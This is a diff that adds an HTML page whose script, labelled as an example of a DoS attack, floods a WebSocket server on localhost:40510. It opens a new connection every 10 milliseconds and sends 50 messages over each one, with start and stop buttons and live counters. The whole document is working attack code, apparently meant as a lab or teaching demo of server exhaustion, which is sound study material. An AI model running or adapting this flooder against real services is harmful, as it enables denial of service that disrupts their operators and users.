@@ -1,0 +1,59 @@
+<button id="start_dos" style="color: RED; font-size: 14px;">Start DoS attack</button>
+<button id="stop_dos" style="color: RED; font-size: 14px;">Stop DoS attack</button>
+<p id="message_count" style="color: RED; font-size: 14px;"></p>
+
+<script>
+    'use strict';
+
+    var ws = null;
+    const URL = "ws://localhost:40510";
+
+    $(() => {
+        $('#websocket_address').text(URL);
+        $('#form').hide();
+        $('#websocket_status').text('ATTACK NOT STARTED');
+
+        let dosInterval;
+
+        $("#start_dos").click((e) =>{
+
+          $('#websocket_status').text('STARTING ATTACK...');
+
+          // ** Example of a DoS attack **
+          let count = 0;
+          let msg_count = 0;
+          dosInterval = setInterval(() => {
+              let ws1 = new WebSocket('ws://localhost:40510')
+
+              ws1.onopen = function () {
+                  count++;
+
+                  ws1.send('Websocket connected!');
+
+                  console.log(count + ' Websockets Connected!');
+                  $('#websocket_status').text(count + ' Websockets Connected!');
+
+                  for(let i = 0; i < 50; i++){
+                    setTimeout(() => {
+                      ws1.send('Websocket message: ' + i);
+                      $('#message_count').text(++msg_count + ' messages sent !');
+                    }, 500);
+                  }
+              }
+
+              ws1.onclose = function(error){
+                console.log('Websocket closed!', error);
+              }
+          }, 10);
+        });
+
+        $("#stop_dos").click((e) =>{
+          clearInterval(dosInterval);
+          $('#websocket_status').text('ATTACK STOPPED')
+        });
+
+    });
+
+
+
+</script>
